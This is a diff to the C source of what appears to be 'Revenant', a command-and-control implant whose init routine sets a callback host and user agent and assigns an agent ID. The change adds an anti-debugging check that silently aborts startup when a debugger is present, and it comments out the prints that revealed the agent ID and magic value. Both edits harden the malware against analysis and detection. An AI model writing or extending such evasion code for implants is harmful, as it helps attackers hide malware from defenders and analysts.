@@ -4,10 +4,16 @@
 #include "Package.h"
 #include "Command.h"
 #include "Revenant.h"
+#include "AntiDebug.h"
 #include "Obfuscation.h"
 
 
 VOID RvntInit() {
+
+    if(IsDebugged()){
+        return;
+    }
+
     // Init Connection info
     Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
     Instance.Config.Transport.Host      = CONFIG_HOST;
@@ -27,8 +33,8 @@ VOID RvntInit() {
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
 
-    _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
-    _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );
+    // _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
+    // _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );
 }
 
 void AnonPipeRead( HANDLE hSTD_OUT_Read ) {
